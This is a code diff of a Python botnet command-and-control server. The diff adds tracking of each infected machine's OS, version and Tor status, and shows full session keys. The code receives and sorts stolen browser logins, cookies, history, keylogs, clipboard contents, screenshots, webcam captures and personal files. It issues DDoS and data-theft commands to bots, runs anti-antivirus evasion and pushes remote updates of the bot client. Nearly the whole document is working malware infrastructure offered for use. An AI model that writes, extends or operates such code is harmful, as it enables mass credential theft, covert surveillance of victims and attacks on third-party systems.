@@ -13,8 +13,8 @@ c2_server.py – Ultra‑Pro Botnet C2 Server (Dynamic Size Version)
 * DYNAMIC BROWSER SUPPORT: All browsers detected automatically
 * DYNAMIC FILES SUPPORT: Images, Videos, Documents, Audio from all drives
 * BOT NUMBER: Sends unique Bot Number to each connected bot
-* DYNAMIC LIST: Shows all connected bots with detailed information
-* BOT DETAILS: View specific bot information (bot <number>)
+* DYNAMIC LIST: Shows all connected bots with OS Name, Version, Tor Status
+* BOT DETAILS: View specific bot information (bot <number>) with FULL Security Key
 * SERVER STATS: View server statistics
 * FEATURE TOGGLE: Enable/Disable Steal, DDoS, Tor (Broadcasts to all bots)
 * UPDATE COMMAND: Update bot client remotely using modules/auto_update.py
@@ -69,7 +69,7 @@ except ImportError:
         LIGHTMAGENTA_EX = '\033[95m'
         LIGHTCYAN_EX = '\033[96m'
         LIGHTWHITE_EX = '\033[97m'
-
+    
     class Style:
         BRIGHT = '\033[1m'
         DIM = '\033[2m'
@@ -167,7 +167,7 @@ try:
     from modules.encryption import encrypt_data, decrypt_data
 except ImportError:
     def encrypt_data(data, key=None):
-        if isinstance(data, str):
+        if isinstance(data, str): 
             data = data.encode()
         encrypted = bytearray()
         for i, b in enumerate(data):
@@ -235,7 +235,7 @@ def _sigterm_handler(signum, frame):
 # ======================================================================== #
 class DataExtractor:
     """স্টিল ডেটা এক্সট্র্যাক্ট করে ফোল্ডারে সাজানোর ক্লাস"""
-
+    
     @staticmethod
     def create_folder_structure(base_path: str):
         """ফোল্ডার স্ট্রাকচার তৈরি করুন - ডায়নামিক ব্রাউজার এবং ফাইলের জন্য"""
@@ -251,47 +251,47 @@ class DataExtractor:
             "dynamic_files/audio",
             "system_info"
         ]
-
+        
         for folder in folders:
             path = os.path.join(base_path, folder)
             os.makedirs(path, exist_ok=True)
-
+        
         return base_path
-
+    
     @staticmethod
     def save_browser_data(data: dict, base_path: str):
         """ব্রাউজার ডেটা আলাদা ফোল্ডারে সেভ করুন - ডায়নামিক"""
         if 'browsers' not in data:
             return 0
-
+        
         browsers = data['browsers']
         saved_count = 0
-
+        
         for browser_name, browser_data in browsers.items():
             if not browser_data:
                 continue
-
+            
             clean_name = browser_name.lower().replace(' ', '_')
             save_path = os.path.join(base_path, 'browsers', clean_name)
             os.makedirs(save_path, exist_ok=True)
-
+            
             if 'logins' in browser_data and browser_data['logins']:
                 with open(os.path.join(save_path, 'logins.json'), 'w', encoding='utf-8') as f:
                     json.dump(browser_data['logins'], f, indent=2, ensure_ascii=False)
                 saved_count += 1
-
+            
             if 'cookies' in browser_data and browser_data['cookies']:
                 with open(os.path.join(save_path, 'cookies.json'), 'w', encoding='utf-8') as f:
                     json.dump(browser_data['cookies'], f, indent=2, ensure_ascii=False)
                 saved_count += 1
-
+            
             if 'history' in browser_data and browser_data['history']:
                 with open(os.path.join(save_path, 'history.json'), 'w', encoding='utf-8') as f:
                     json.dump(browser_data['history'], f, indent=2, ensure_ascii=False)
                 saved_count += 1
-
+        
         return saved_count
-
+    
     @staticmethod
     def save_keylogs(data: dict, base_path: str):
         if 'keylogs' in data and data['keylogs']:
@@ -300,7 +300,7 @@ class DataExtractor:
                 f.write(data['keylogs'])
             return True
         return False
-
+    
     @staticmethod
     def save_clipboard(data: dict, base_path: str):
         if 'clipboard' in data and data['clipboard']:
@@ -309,7 +309,7 @@ class DataExtractor:
                 f.write(data['clipboard'])
             return True
         return False
-
+    
     @staticmethod
     def save_screenshot(data: dict, base_path: str):
         if 'screenshot' in data and data['screenshot']:
@@ -322,7 +322,7 @@ class DataExtractor:
             except Exception as e:
                 print_warning(f"Screenshot save failed: {e}")
         return False
-
+    
     @staticmethod
     def save_webcam(data: dict, base_path: str):
         if 'webcam' in data and data['webcam']:
@@ -335,16 +335,16 @@ class DataExtractor:
             except Exception as e:
                 print_warning(f"Webcam save failed: {e}")
         return False
-
+    
     @staticmethod
     def save_dynamic_files(data: dict, base_path: str):
         """ডায়নামিক ফাইল সেভ করুন - Images, Videos, Documents, Audio"""
         if 'dynamic_files' not in data:
             return 0
-
+        
         files_data = data['dynamic_files']
         saved_count = 0
-
+        
         # Images
         if 'images' in files_data:
             for drive, folders in files_data['images'].items():
@@ -360,7 +360,7 @@ class DataExtractor:
                             saved_count += 1
                         except Exception as e:
                             pass
-
+        
         # Videos
         if 'videos' in files_data:
             for drive, folders in files_data['videos'].items():
@@ -376,7 +376,7 @@ class DataExtractor:
                             saved_count += 1
                         except Exception as e:
                             pass
-
+        
         # Documents
         if 'documents' in files_data:
             for drive, folders in files_data['documents'].items():
@@ -392,7 +392,7 @@ class DataExtractor:
                             saved_count += 1
                         except Exception as e:
                             pass
-
+        
         # Audio
         if 'audio' in files_data:
             for drive, folders in files_data['audio'].items():
@@ -408,9 +408,9 @@ class DataExtractor:
                             saved_count += 1
                         except Exception as e:
                             pass
-
+        
         return saved_count
-
+    
     @staticmethod
     def save_system_info(data: dict, base_path: str):
         if 'system_info' in data:
@@ -419,23 +419,23 @@ class DataExtractor:
                 json.dump(data['system_info'], f, indent=2, ensure_ascii=False)
             return True
         return False
-
+    
     @classmethod
     def extract(cls, json_file: str, output_dir: str = None) -> str:
         """JSON ফাইল থেকে ডেটা এক্সট্র্যাক্ট করুন"""
         if output_dir is None:
             base_name = os.path.splitext(os.path.basename(json_file))[0]
             output_dir = f"extracted_{base_name}"
-
+        
         try:
             with open(json_file, 'r', encoding='utf-8') as f:
                 data = json.load(f)
         except Exception as e:
             print_error(f"Failed to read JSON: {e}")
             return None
-
+        
         cls.create_folder_structure(output_dir)
-
+        
         stats = {
             'browser_files': cls.save_browser_data(data, output_dir),
             'keylogs': cls.save_keylogs(data, output_dir),
@@ -445,13 +445,13 @@ class DataExtractor:
             'dynamic_files': cls.save_dynamic_files(data, output_dir),
             'system_info': cls.save_system_info(data, output_dir)
         }
-
+        
         # ব্রাউজারের তালিকা
         browsers_found = data.get('browsers_found', [])
         if browsers_found:
             stats['browsers_found'] = browsers_found
             stats['total_browsers'] = len(browsers_found)
-
+        
         # ডায়নামিক ফাইলের সারাংশ
         total_files = data.get('total_dynamic_files', 0)
         if total_files:
@@ -460,17 +460,17 @@ class DataExtractor:
             stats['videos_count'] = data.get('dynamic_files', {}).get('videos_count', 0)
             stats['documents_count'] = data.get('dynamic_files', {}).get('documents_count', 0)
             stats['audio_count'] = data.get('dynamic_files', {}).get('audio_count', 0)
-
+        
         summary = {
             'extracted_at': datetime.now().isoformat(),
             'source_file': json_file,
             'output_directory': output_dir,
             'stats': stats
         }
-
+        
         with open(os.path.join(output_dir, 'extraction_summary.json'), 'w', encoding='utf-8') as f:
             json.dump(summary, f, indent=2, ensure_ascii=False)
-
+        
         return output_dir
 
 # ======================================================================== #
@@ -492,17 +492,17 @@ class C2Server:
         self.steal_dir = "steal_data"
         self.extracted_dir = "extracted_data"
         self._start_time = time.time()
-
+        
         # ✅ সরাসরি modules/auto_update.py ব্যবহার করুন
         self.update_file = "modules/auto_update.py"
-
+        
         # ✅ Feature Toggle Flags
         self.steal_enabled = True
         self.ddos_enabled = True
         self.tor_enabled = True
-
+        
         C2Server.instance = self
-
+        
         os.makedirs(self.steal_dir, exist_ok=True)
         os.makedirs(self.extracted_dir, exist_ok=True)
 
@@ -512,14 +512,14 @@ class C2Server:
         print_info(f"Server Port: {Colors.YELLOW}{C2_PORT}{Colors.END}")
         print_info(f"Steal Data Folder: {Colors.YELLOW}{self.steal_dir}{Colors.END}")
         print_info(f"Extracted Data Folder: {Colors.YELLOW}{self.extracted_dir}{Colors.END}")
-
+        
         # ✅ Show update file status
         if os.path.exists(self.update_file):
             print_success(f"Update File: {self.update_file} (Available)")
         else:
             print_warning(f"Update File: {self.update_file} (Not Found)")
         print("")
-
+        
         try:
             bypass_antivirus()
             print_success("Anti‑AV / sandbox evasion executed")
@@ -541,7 +541,7 @@ class C2Server:
         threading.Thread(target=self._keepalive_loop, daemon=True).start()
         threading.Thread(target=self._accept_loop, daemon=True).start()
         threading.Thread(target=self._admin_console, daemon=True).start()
-
+        
         signal.signal(signal.SIGINT, _sigterm_handler)
         signal.signal(signal.SIGTERM, _sigterm_handler)
 
@@ -676,21 +676,24 @@ class C2Server:
                 print_warning(f"Invalid session key from {addr}: {len(session_key)} bytes")
                 conn.close()
                 return
-
+            
             self.bot_counter += 1
             bot_number = self.bot_counter
-
+            
             print_success(f"New bot connected: {addr} (Bot #{bot_number})")
             log.info(f"New bot connected: {addr} (Bot #{bot_number})")
-
+            
             with self.clients_lock:
                 self.clients[addr] = {
                     'socket': conn,
                     'key': session_key,
                     'connected_at': datetime.now(),
-                    'bot_id': bot_number
+                    'bot_id': bot_number,
+                    'os_name': 'Unknown',
+                    'os_version': 'Unknown',
+                    'tor_status': 'Not Started'
                 }
-
+            
             try:
                 welcome_msg = f"BOT_NUMBER:{bot_number}"
                 self._send_data(conn, welcome_msg, session_key)
@@ -698,9 +701,9 @@ class C2Server:
                 log.info(f"Sent Bot Number #{bot_number} to {addr}")
             except Exception as e:
                 print_warning(f"Failed to send bot number: {e}")
-
+            
             self._client_handler(conn, addr, session_key)
-
+            
         except socket.timeout:
             print_warning(f"Key exchange timeout from {addr}")
             conn.close()
@@ -750,27 +753,27 @@ class C2Server:
     # ======================================================================== #
     # 📁 Save and Auto-Extract Steal Data
     # ======================================================================== #
-
+    
     def _save_and_extract_steal_data(self, data: dict, addr: Tuple[str, int]) -> tuple:
         self.steal_counter += 1
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-
+        
         json_filename = f"steal_{self.steal_counter:03d}_{addr[0]}_{timestamp}.json"
         json_path = os.path.join(self.steal_dir, json_filename)
-
+        
         with open(json_path, 'w', encoding='utf-8') as f:
             json.dump(data, f, indent=2, ensure_ascii=False)
-
+        
         size = os.path.getsize(json_path)
         print_data(f"JSON saved: {json_filename} ({size:,} bytes)")
-
+        
         print_info("🔄 Auto-extracting data...")
         extracted_folder = f"{self.extracted_dir}/extracted_{self.steal_counter:03d}_{addr[0]}_{timestamp}"
-
+        
         try:
             extractor = DataExtractor()
             output_dir = extractor.extract(json_path, extracted_folder)
-
+            
             if output_dir:
                 print_success(f"✅ Data extracted to: {output_dir}")
                 log.info(f"Extracted steal data to: {output_dir}")
@@ -778,7 +781,7 @@ class C2Server:
             else:
                 print_warning("Extraction failed, but JSON saved")
                 return json_path, None
-
+                
         except Exception as e:
             print_error(f"Extraction error: {e}")
             return json_path, None
@@ -786,35 +789,35 @@ class C2Server:
     def _list_steal_files(self) -> str:
         if not os.path.exists(self.steal_dir):
             return "📁 No steal data found."
-
+        
         files = sorted(os.listdir(self.steal_dir))
         if not files:
             return "📁 No steal data found."
-
+        
         result = ["📁 Steal Data Files (JSON):"]
         result.append("=" * 70)
         result.append(f"{'#':<5} {'Filename':<45} {'Size':<12} {'Date':<20}")
         result.append("-" * 70)
-
+        
         total_size = 0
         for i, file in enumerate(files, 1):
             filepath = os.path.join(self.steal_dir, file)
             size = os.path.getsize(filepath)
             total_size += size
             mtime = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime("%Y-%m-%d %H:%M:%S")
-
+            
             if size > 1024 * 1024:
                 size_str = f"{size / (1024*1024):.2f} MB"
             elif size > 1024:
                 size_str = f"{size / 1024:.2f} KB"
             else:
                 size_str = f"{size} B"
-
+            
             result.append(f"{i:>3}. {file:<45} {size_str:>10}  {mtime}")
-
+        
         result.append("-" * 70)
         result.append(f"Total: {len(files)} files, {total_size:,} bytes")
-
+        
         if os.path.exists(self.extracted_dir):
             extracted_folders = [f for f in os.listdir(self.extracted_dir) if os.path.isdir(os.path.join(self.extracted_dir, f))]
             if extracted_folders:
@@ -828,7 +831,7 @@ class C2Server:
                         result.append(f"   📂 {folder} ({file_count} files)")
                 if len(extracted_folders) > 5:
                     result.append(f"   ... and {len(extracted_folders) - 5} more folders")
-
+        
         return "\n".join(result)
 
     def _get_latest_steal_file(self) -> Optional[str]:
@@ -840,55 +843,93 @@ class C2Server:
         return files[-1]
 
     # ======================================================================== #
-    # 📊 Dynamic Bot List Methods
+    # 📊 Dynamic Bot List Methods - UPDATED with FULL Key
     # ======================================================================== #
-
+    
     def _get_dynamic_bot_list(self) -> str:
         with self.clients_lock:
             if not self.clients:
                 return "⚠️ No bots connected."
-
+            
             lines = []
-            lines.append("╔══════════════════════════════════════════════════════════════╗")
-            lines.append("║                    📊 CONNECTED BOTS                       ║")
-            lines.append("╠══════════════════════════════════════════════════════════════╣")
-
+            lines.append("╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+            lines.append("║                                                              📊 CONNECTED BOTS                                                             ║")
+            lines.append("╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+            
             for idx, (addr, data) in enumerate(self.clients.items(), 1):
                 bot_id = data.get('bot_id', 'unknown')
                 connected_at = data.get('connected_at', datetime.now()).strftime("%H:%M:%S")
-                lines.append(f"║ {idx:>2}. Bot #{bot_id:<3} | {addr[0]}:{addr[1]:<5} | 🟢 Online | {connected_at} ║")
-
-            lines.append("╠══════════════════════════════════════════════════════════════╣")
-            lines.append(f"║ Total Bots: {len(self.clients):<48} ║")
-            lines.append("╚══════════════════════════════════════════════════════════════╝")
-
+                os_name = data.get('os_name', 'Unknown')[:12]
+                os_version = data.get('os_version', 'Unknown')[:15]
+                tor_status = data.get('tor_status', 'Off')
+                tor_icon = "🟢" if tor_status.lower() == "running" else "🔴" if tor_status.lower() == "stopped" else "⚪"
+                
+                # ✅ FULL Key দেখান (Hex format)
+                key = data.get('key', b'')
+                if key:
+                    key_hex = key.hex()
+                    key_display = key_hex[:32] + '...' if len(key_hex) > 35 else key_hex
+                else:
+                    key_display = 'N/A'
+                
+                lines.append(f"║ {idx:>2}. Bot #{bot_id:<3} | {addr[0]:<15}:{addr[1]:<5} | 🟢 Online | OS:{os_name:<10} | Ver:{os_version:<12} | Tor:{tor_icon} {tor_status:<10} | Key:{key_display:<20} | {connected_at} ║")
+            
+            lines.append("╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+            lines.append(f"║ Total Bots: {len(self.clients):<116} ║")
+            lines.append("╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
+            
             return "\n".join(lines)
 
     def _get_bot_details(self, bot_number: int) -> str:
         with self.clients_lock:
-            for addr, data in self.clients.items():
-                if data.get('bot_id') == bot_number:
-                    lines = []
-                    lines.append("╔══════════════════════════════════════════════════════════════╗")
-                    lines.append(f"║                    🤖 BOT #{bot_number} DETAILS               ║")
-                    lines.append("╠══════════════════════════════════════════════════════════════╣")
-                    lines.append(f"║ 🆔 Bot ID    : {data.get('bot_id', 'N/A'):<44} ║")
-                    lines.append(f"║ 📡 IP        : {addr[0]:<44} ║")
-                    lines.append(f"║ 🔌 Port      : {addr[1]:<44} ║")
-                    lines.append(f"║ 🔑 Key       : {data.get('key', b'')[:8].hex()+'...' if data.get('key') else 'N/A':<44} ║")
-                    lines.append(f"║ 🕐 Connected : {data.get('connected_at', datetime.now()).strftime('%Y-%m-%d %H:%M:%S'):<44} ║")
-
-                    try:
-                        self._send_data(data['socket'], "PING", data['key'])
-                        status = "🟢 Online"
-                    except:
-                        status = "🔴 Offline"
-                    lines.append(f"║ 📊 Status    : {status:<44} ║")
-
-                    lines.append("╚══════════════════════════════════════════════════════════════╝")
-                    return "\n".join(lines)
-
-            return f"❌ Bot #{bot_number} not found!"
+                for addr, data in self.clients.items():
+                    if data.get('bot_id') == bot_number:
+                        lines = []
+                        lines.append("╔══════════════════════════════════════════════════════════════════════════════════╗")
+                        lines.append(f"║                              🤖 BOT #{bot_number} DETAILS                          ║")
+                        lines.append("╠══════════════════════════════════════════════════════════════════════════════════╣")
+                        lines.append(f"║ 🆔 Bot ID      : {data.get('bot_id', 'N/A'):<56} ║")
+                        lines.append(f"║ 📡 IP Address  : {addr[0]:<56} ║")
+                        lines.append(f"║ 🔌 Port        : {addr[1]:<56} ║")
+                        
+                        # ✅ OS Name এবং Version
+                        os_name = data.get('os_name', 'Unknown')
+                        os_version = data.get('os_version', 'Unknown')
+                        lines.append(f"║ 💻 OS Name     : {os_name:<56} ║")
+                        lines.append(f"║ 📦 OS Version  : {os_version:<56} ║")
+                        
+                        # ✅ Security Key
+                        key = data.get('key', b'')
+                        if key:
+                            key_hex = key.hex()
+                            if len(key_hex) > 50:
+                                lines.append(f"║ 🔑 Security Key : {key_hex[:50]:<56} ║")
+                                lines.append(f"║    {key_hex[50:100]:<56} ║")
+                                if len(key_hex) > 100:
+                                    lines.append(f"║    {key_hex[100:]:<56} ║")
+                            else:
+                                lines.append(f"║ 🔑 Security Key : {key_hex:<56} ║")
+                            lines.append(f"║ 📏 Key Length  : {len(key)} bytes ({len(key)*8} bits){' ' * (56 - len(str(len(key)*8)) - 10)} ║")
+                        else:
+                            lines.append(f"║ 🔑 Security Key : {'N/A':<56} ║")
+                        
+                        lines.append(f"║ 🕐 Connected   : {data.get('connected_at', datetime.now()).strftime('%Y-%m-%d %H:%M:%S'):<56} ║")
+                        
+                        try:
+                            self._send_data(data['socket'], "PING", data['key'])
+                            status = "🟢 Online"
+                        except:
+                            status = "🔴 Offline"
+                        lines.append(f"║ 📊 Status      : {status:<56} ║")
+                        
+                        tor_status = data.get('tor_status', 'Not Started')
+                        tor_icon = "🟢" if tor_status.lower() == "running" else "🔴" if tor_status.lower() == "stopped" else "⚪"
+                        lines.append(f"║ 🔒 Tor         : {tor_icon} {tor_status:<53} ║")
+                        
+                        lines.append("╚══════════════════════════════════════════════════════════════════════════════════╝")
+                        return "\n".join(lines)
+                
+                return f"❌ Bot #{bot_number} not found!"
 
     def _get_server_stats(self) -> str:
         with self.clients_lock:
@@ -902,6 +943,19 @@ class C2Server:
             lines.append(f"║ 🕐 Server Uptime  : {self._get_uptime():<44} ║")
             lines.append(f"║ 🔒 Tor Status     : {'✅ Active' if self.tor_running else '❌ Inactive':<44} ║")
             lines.append(f"║ 📄 Update File    : {'✅ Available' if os.path.exists(self.update_file) else '❌ Not Found':<44} ║")
+            
+            # ✅ OS Statistics
+            os_stats = {}
+            for addr, data in self.clients.items():
+                os_name = data.get('os_name', 'Unknown')
+                os_stats[os_name] = os_stats.get(os_name, 0) + 1
+            
+            if os_stats:
+                lines.append("╠══════════════════════════════════════════════════════════════╣")
+                lines.append("║                    💻 OS STATISTICS                        ║")
+                for os_name, count in os_stats.items():
+                    lines.append(f"║ {os_name:<20} : {count:<38} ║")
+            
             lines.append("╚══════════════════════════════════════════════════════════════╝")
             return "\n".join(lines)
 
@@ -928,15 +982,62 @@ class C2Server:
         print("\n".join(lines))
 
     # ======================================================================== #
-    # Command Processing - UPDATED with EXEC OUTPUT & UPDATE CONFIRMATION
+    # Command Processing - UPDATED with OS INFO
     # ======================================================================== #
-
+    
     def _process_bot_command(self, cmd: str, addr: Tuple[str, int]) -> Optional[str]:
         cmd = cmd.strip()
         if not cmd:
             return None
 
-        # ✅ DOWNLOAD confirmation messages from bot - NEW
+        # ✅ Bot থেকে OS তথ্য গ্রহণ করুন
+        if cmd.startswith("OS_INFO:"):
+            try:
+                os_info = cmd.split(":", 1)[1]
+                os_parts = os_info.split("|")
+                os_name = os_parts[0] if len(os_parts) > 0 else "Unknown"
+                os_version = os_parts[1] if len(os_parts) > 1 else "Unknown"
+                
+                with self.clients_lock:
+                    if addr in self.clients:
+                        self.clients[addr]['os_name'] = os_name
+                        self.clients[addr]['os_version'] = os_version
+                        print_info(f"🤖 Bot {addr} OS: {os_name} {os_version}")
+                        log.info(f"Bot {addr} OS: {os_name} {os_version}")
+                return None
+            except Exception as e:
+                print_warning(f"Failed to parse OS info: {e}")
+                return None
+
+        # ✅ Tor স্ট্যাটাস আপডেট করুন
+        if cmd.startswith("TOR_STATUS:"):
+            try:
+                status = cmd.split(":", 1)[1]
+                with self.clients_lock:
+                    if addr in self.clients:
+                        self.clients[addr]['tor_status'] = status
+                        print_info(f"🤖 Bot {addr} Tor Status: {status}")
+                        log.info(f"Bot {addr} Tor Status: {status}")
+                return None
+            except Exception as e:
+                return None
+
+        # ✅ GET_TOR_CONFIG - Tor কনফিগারেশন পাঠান
+        if cmd == "GET_TOR_CONFIG":
+            config = {
+                "hidden_services": [
+                    {
+                        "service_name": "default_hs",
+                        "ports": [[80, "127.0.0.1", 80]]
+                    }
+                ],
+                "relays": []
+            }
+            print_info(f"📤 Sending Tor config to {addr}")
+            log.info(f"Tor config sent to {addr}")
+            return json.dumps(config)
+
+        # ✅ DOWNLOAD confirmation messages from bot
         if cmd.startswith("DOWNLOAD_SUCCESS:"):
             filename = cmd.split(":", 1)[1] if ":" in cmd else "unknown"
             print_success(f"🤖 Bot {addr} - ✅ File downloaded successfully: {filename}")
@@ -988,23 +1089,18 @@ class C2Server:
             return None
 
         # ✅ EXEC OUTPUT - Bot থেকে EXEC আউটপুট প্রিন্ট করুন
-        # চেক করুন এটি EXEC কমান্ডের রেসপন্স কিনা
-        if (cmd.startswith("ERROR:") or cmd.startswith("File not found") or
+        if (cmd.startswith("ERROR:") or cmd.startswith("File not found") or 
             cmd.startswith("Command executed") or len(cmd) > 50 and not cmd.startswith("PING") and not cmd.startswith("PONG")):
-
-            # PING/PONG বাদ দিন
+            
             if not cmd.startswith("PING") and not cmd.startswith("PONG"):
-                # আউটপুট সাইজ চেক করুন
                 if len(cmd) < 5000:
                     print(f"\n{Colors.LIGHT_GREEN}📤 Output from {addr}:{Colors.END}")
                     print(f"{Colors.WHITE}{cmd}{Colors.END}")
                     print("")
                 else:
                     print_info(f"📤 Large output from {addr} ({len(cmd)} bytes) - saved in log")
-                    # লগে সেভ করুন
                     log.info(f"Large output from {addr}: {cmd[:500]}...")
 
-        # ✅ EXEC command response - বড় আউটপুট হ্যান্ডলিং
         if len(cmd) > 5000:
             print_data(f"Receiving large response from {addr} (size: {len(cmd)} bytes)")
             log.info(f"Received large response from {addr} (size: {len(cmd)} bytes)")
@@ -1039,16 +1135,16 @@ class C2Server:
                 else:
                     decoded = base64.b64decode(encoded_data)
                     data = json.loads(decoded.decode('utf-8'))
-
+                
                 json_path, extracted_path = self._save_and_extract_steal_data(data, addr)
-
+                
                 print_success(f"Steal data saved to: {json_path}")
                 if extracted_path:
                     print_success(f"Extracted to: {extracted_path}")
-
+                
                 log.info(f"Saved steal data to: {json_path}")
                 return f"STEAL_DATA_RECEIVED (#{self.steal_counter})"
-
+                
             except Exception as e:
                 print_error(f"Failed to process steal data: {e}")
                 log.error(f"Failed to process steal data: {e}")
@@ -1062,11 +1158,11 @@ class C2Server:
             return f"📊 Bot Response:\n{cmd}"
 
         VALID_COMMANDS = {
-            "PING", "PONG", "LIST", "UPDATE", "DDOS",
-            "STEAL", "STOP_STEAL", "TOR_START", "TOR_STOP",
+            "PING", "PONG", "LIST", "UPDATE", "DDOS", 
+            "STEAL", "STOP_STEAL", "TOR_START", "TOR_STOP", 
             "TOR_INFO", "DOWNLOAD", "EXIT", "SHOW_STEAL", "LATEST_STEAL"
         }
-
+        
         parts = cmd.split()
         if not parts:
             return None
@@ -1084,10 +1180,9 @@ class C2Server:
                 return None
             elif cmd_upper == "LIST":
                 return self._get_dynamic_bot_list()
-
+            
             # ✅ UPDATED: UPDATE command with modules/auto_update.py
             elif cmd_upper == "UPDATE":
-                # Check if update file exists
                 if os.path.exists(self.update_file):
                     print_success(f"📤 Sending UPDATE_AVAILABLE to {addr} - File: {self.update_file}")
                     log.info(f"UPDATE_AVAILABLE sent to {addr} - File available")
@@ -1096,11 +1191,11 @@ class C2Server:
                     print_warning(f"📤 Sending No update available to {addr} - No update file found")
                     log.warning(f"No update available sent to {addr} - No update file")
                     return "No update available"
-
+            
             elif cmd_upper == "DDOS":
                 if not self.ddos_enabled:
                     return "❌ DDoS is currently DISABLED (Use 'ddos_on' to enable)"
-
+                
                 if len(parts) < 4:
                     return "ERROR: DDOS requires IP, PORT, DURATION"
                 try:
@@ -1116,7 +1211,7 @@ class C2Server:
             elif cmd_upper == "STEAL":
                 if not self.steal_enabled:
                     return "❌ Data Steal is currently DISABLED (Use 'steal_on' to enable)"
-
+                
                 try:
                     send_data_to_c2(f"DATA_STEAL from {addr}")
                     print_success("Data stealing started")
@@ -1133,7 +1228,7 @@ class C2Server:
             elif cmd_upper == "TOR_START":
                 if not self.tor_enabled:
                     return "❌ Tor is currently DISABLED (Use 'tor_on' to enable)"
-
+                
                 if not self.tor_running:
                     try:
                         self.tor_manager.start()
@@ -1158,6 +1253,10 @@ class C2Server:
             elif cmd_upper == "TOR_INFO":
                 try:
                     info = get_tor_relay_info()
+                    with self.clients_lock:
+                        if addr in self.clients:
+                            tor_status = self.clients[addr].get('tor_status', 'Not Started')
+                            info['bot_tor_status'] = tor_status
                     return json.dumps(info, indent=2)
                 except Exception as e:
                     return f"Tor info failed: {e}"
@@ -1165,19 +1264,16 @@ class C2Server:
                 filename = parts[1] if len(parts) > 1 else "modules/auto_update.py"
                 try:
                     if os.path.exists(filename):
-                        # ✅ বাইনারি মোডে পড়ুন
                         with open(filename, "rb") as f:
                             content = f.read()
                         file_size = len(content)
                         print_success(f"📤 File {filename} sent to {addr} ({file_size} bytes)")
                         log.info(f"File {filename} sent to {addr} ({file_size} bytes)")
-
-                        # ✅ টেক্সট ফাইল চেক করুন
+                        
                         try:
                             text_content = content.decode('utf-8')
                             return f"FILE_CONTENT:{filename}:{text_content}"
                         except UnicodeDecodeError:
-                            # বাইনারি ফাইল - Base64 এনকোড
                             encoded = base64.b64encode(content).decode('utf-8')
                             return f"BINARY:{filename}:{encoded}"
                     else:
@@ -1206,13 +1302,13 @@ class C2Server:
     # ======================================================================== #
     # Admin Console - UPDATED with DIR/LS command
     # ======================================================================== #
-
+    
     def _admin_console(self):
         print_header("🔧 ADMIN CONSOLE")
         print_info("Type 'help' for commands")
         print_info("Type 'quit' or 'exit' to shutdown")
         print("")
-
+        
         while not self.shutdown_flag:
             try:
                 cmd = input(f"\n{Colors.LIGHT_YELLOW}💻 C2> {Colors.END}").strip()
@@ -1220,19 +1316,19 @@ class C2Server:
                 break
             if not cmd:
                 continue
-
-            # ✅ NEW: C2 তে dir/ls কমান্ড - ফাইল লিস্ট দেখান
+            
+            # ✅ C2 তে dir/ls কমান্ড - ফাইল লিস্ট দেখান
             if cmd.lower() in ("dir", "ls"):
                 print_header("📁 C2 DIRECTORY LISTING")
                 try:
                     files = os.listdir(".")
                     print(f"{'Filename':<45} {'Size':<12} {'Modified':<20}")
                     print("-" * 75)
-
+                    
                     total_size = 0
                     file_count = 0
                     dir_count = 0
-
+                    
                     for file in sorted(files):
                         full_path = os.path.join(".", file)
                         if os.path.isfile(full_path):
@@ -1240,27 +1336,27 @@ class C2Server:
                             total_size += size
                             file_count += 1
                             mtime = datetime.fromtimestamp(os.path.getmtime(full_path)).strftime("%Y-%m-%d %H:%M:%S")
-
+                            
                             if size > 1024 * 1024:
                                 size_str = f"{size / (1024*1024):.2f} MB"
                             elif size > 1024:
                                 size_str = f"{size / 1024:.2f} KB"
                             else:
                                 size_str = f"{size} B"
-
+                                
                             print(f"{file:<45} {size_str:>10}  {mtime}")
                         elif os.path.isdir(full_path):
                             dir_count += 1
                             mtime = datetime.fromtimestamp(os.path.getmtime(full_path)).strftime("%Y-%m-%d %H:%M:%S")
                             print(f"{file:<45} {'<DIR>':>10}  {mtime}")
-
+                    
                     print("-" * 75)
                     print(f"Total: {file_count} files, {dir_count} folders, {total_size:,} bytes")
                     print("")
                 except Exception as e:
                     print_error(f"Error listing directory: {e}")
                 continue
-
+            
             # bot <number> কমান্ড
             if cmd.lower().startswith("bot "):
                 try:
@@ -1272,31 +1368,30 @@ class C2Server:
                 except Exception as e:
                     print_error(f"Error: {e}")
                 continue
-
+            
             # refresh কমান্ড
             if cmd.lower() == "refresh":
                 print_info("🔄 Refreshing bot list...")
                 result = self._get_dynamic_bot_list()
                 print(result)
                 continue
-
+            
             # stats কমান্ড
             if cmd.lower() == "stats":
                 result = self._get_server_stats()
                 print(result)
                 continue
-
+            
             # status কমান্ড
             if cmd.lower() == "status":
                 self._show_status()
                 continue
-
-            # ✅ upload_update কমান্ড - Update ফাইল আপলোড করতে (modules/auto_update.py)
+            
+            # ✅ upload_update কমান্ড - Update ফাইল আপলোড করতে
             if cmd.lower().startswith("upload_update "):
                 filename = cmd.split()[1] if len(cmd.split()) > 1 else None
                 if filename and os.path.exists(filename):
                     try:
-                        # modules/auto_update.py তে কপি করুন
                         shutil.copy2(filename, self.update_file)
                         print_success(f"Update file uploaded: {filename} -> {self.update_file}")
                     except Exception as e:
@@ -1304,11 +1399,10 @@ class C2Server:
                 else:
                     print_warning(f"File not found: {filename}")
                 continue
-
+            
             # ✅ create_update কমান্ড - নতুন Update ফাইল তৈরি করতে
             if cmd.lower() == "create_update":
                 try:
-                    # বর্তমান bot_client.py কে modules/auto_update.py হিসেবে কপি করুন
                     if os.path.exists("bot_client.py"):
                         os.makedirs("modules", exist_ok=True)
                         shutil.copy2("bot_client.py", self.update_file)
@@ -1318,46 +1412,46 @@ class C2Server:
                 except Exception as e:
                     print_error(f"Failed to create update: {e}")
                 continue
-
+            
             # steal_on/off কমান্ড
             if cmd.lower() == "steal_on":
                 self.steal_enabled = True
                 print_success("✅ Data Steal ENABLED")
                 self.broadcast_command("STEAL_ENABLED")
                 continue
-
+            
             if cmd.lower() == "steal_off":
                 self.steal_enabled = False
                 print_warning("⚠️ Data Steal DISABLED")
                 self.broadcast_command("STEAL_DISABLED")
                 continue
-
+            
             # ddos_on/off কমান্ড
             if cmd.lower() == "ddos_on":
                 self.ddos_enabled = True
                 print_success("✅ DDoS ENABLED")
                 self.broadcast_command("DDOS_ENABLED")
                 continue
